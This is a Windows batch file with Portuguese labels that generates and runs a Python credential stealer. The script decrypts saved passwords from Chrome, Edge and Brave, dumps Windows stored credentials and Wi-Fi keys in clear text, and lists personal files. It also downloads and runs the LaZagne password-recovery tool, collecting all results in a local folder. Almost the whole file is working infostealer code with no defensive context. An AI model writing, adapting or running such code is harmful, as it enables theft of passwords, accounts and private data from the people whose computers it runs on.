@echo off
title Extraindo dados...
color 0A

echo Criando script Python...

> _extrair_tudo.py echo import os, json, base64, shutil, sqlite3, subprocess
>> _extrair_tudo.py echo from pathlib import Path
>> _extrair_tudo.py echo from Cryptodome.Cipher import AES
>> _extrair_tudo.py echo import win32crypt
>> _extrair_tudo.py echo def get_key(browser): 
>> _extrair_tudo.py echo     local_state_paths = {
>> _extrair_tudo.py echo         "Chrome": os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Local State",
>> _extrair_tudo.py echo         "Edge": os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Local State",
>> _extrair_tudo.py echo         "Brave": os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Local State",
>> _extrair_tudo.py echo         "Opera": os.getenv("APPDATA") + r"\Opera Software\Opera Stable\Local State"
>> _extrair_tudo.py echo     }
>> _extrair_tudo.py echo     path = local_state_paths.get(browser)
>> _extrair_tudo.py echo     if not path or not os.path.exists(path): return None
>> _extrair_tudo.py echo     with open(path, "r", encoding="utf-8") as f:
>> _extrair_tudo.py echo         key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
>> _extrair_tudo.py echo     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

>> _extrair_tudo.py echo def decrypt(buff, key): 
>> _extrair_tudo.py echo     try:
>> _extrair_tudo.py echo         iv = buff[3:15]
>> _extrair_tudo.py echo         payload = buff[15:]
>> _extrair_tudo.py echo         cipher = AES.new(key, AES.MODE_GCM, iv)
>> _extrair_tudo.py echo         return cipher.decrypt(payload)[:-16].decode()
>> _extrair_tudo.py echo     except:
>> _extrair_tudo.py echo         try: return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
>> _extrair_tudo.py echo         except: return "Erro"

>> _extrair_tudo.py echo def extrair_senhas(browser, db_path, out_file): 
>> _extrair_tudo.py echo     key = get_key(browser)
>> _extrair_tudo.py echo     if not key or not os.path.exists(db_path): return
>> _extrair_tudo.py echo     shutil.copy2(db_path, "temp.db")
>> _extrair_tudo.py echo     conn = sqlite3.connect("temp.db")
>> _extrair_tudo.py echo     cur = conn.cursor()
>> _extrair_tudo.py echo     cur.execute("SELECT origin_url, username_value, password_value FROM logins")
>> _extrair_tudo.py echo     with open(out_file, "a", encoding="utf-8") as f:
>> _extrair_tudo.py echo         for row in cur.fetchall():
>> _extrair_tudo.py echo             f.write(f"Site: {row[0]}\nUser: {row[1]}\nSenha: {decrypt(row[2], key)}\n\n")
>> _extrair_tudo.py echo     conn.close(); os.remove("temp.db")

>> _extrair_tudo.py echo def credenciais(): 
>> _extrair_tudo.py echo     out = subprocess.check_output("cmdkey /list", shell=True, text=True)
>> _extrair_tudo.py echo     with open("dados_extraidos\\credenciais_pc.txt", "w", encoding="utf-8") as f: f.write(out)

>> _extrair_tudo.py echo def wifi(): 
>> _extrair_tudo.py echo     output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
>> _extrair_tudo.py echo     redes = [i.split(":")[1].strip() for i in output.splitlines() if "Todos os Perfis" in i]
>> _extrair_tudo.py echo     with open("dados_extraidos\\senhas_wifi.txt", "w", encoding="utf-8") as f:
>> _extrair_tudo.py echo         for r in redes:
>> _extrair_tudo.py echo             res = subprocess.run(f'netsh wlan show profile name="{r}" key=clear', shell=True, capture_output=True, text=True)
>> _extrair_tudo.py echo             f.write(f"\n===== {r} =====\n{res.stdout}\n")

>> _extrair_tudo.py echo def arquivos(): 
>> _extrair_tudo.py echo     locais = [Path.home() / "Desktop", Path.home() / "Documents", Path.home() / "Downloads"]
>> _extrair_tudo.py echo     with open("dados_extraidos\\arquivos_pessoais.txt", "w", encoding="utf-8") as f:
>> _extrair_tudo.py echo         for local in locais:
>> _extrair_tudo.py echo             for path in local.rglob("*"):
>> _extrair_tudo.py echo                 if path.is_file(): f.write(str(path) + "\n")

>> _extrair_tudo.py echo def executar_lazagne():
>> _extrair_tudo.py echo     if not os.path.exists("LaZagne.exe"):
>> _extrair_tudo.py echo         print("Baixando LaZagne...")
>> _extrair_tudo.py echo         url = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4/LaZagne.exe"
>> _extrair_tudo.py echo         subprocess.run(f"curl -L -o LaZagne.exe {url}", shell=True)
>> _extrair_tudo.py echo     subprocess.run("LaZagne.exe all", shell=True, stdout=open("dados_extraidos\\resultados_lazagne.txt", "w"))

>> _extrair_tudo.py echo os.makedirs("dados_extraidos", exist_ok=True)
>> _extrair_tudo.py echo extrair_senhas("Chrome", os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data", "dados_extraidos\\senhas_chrome.txt")
>> _extrair_tudo.py echo extrair_senhas("Edge", os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default\Login Data", "dados_extraidos\\senhas_edge.txt")
>> _extrair_tudo.py echo extrair_senhas("Brave", os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Default\Login Data", "dados_extraidos\\senhas_brave.txt")
>> _extrair_tudo.py echo credenciais()
>> _extrair_tudo.py echo wifi()
>> _extrair_tudo.py echo arquivos()
>> _extrair_tudo.py echo executar_lazagne()
>> _extrair_tudo.py echo print("✅ Tudo finalizado. Resultados em 'dados_extraidos'")

echo Executando o script...
python _extrair_tudo.py

echo Finalizado.
pause
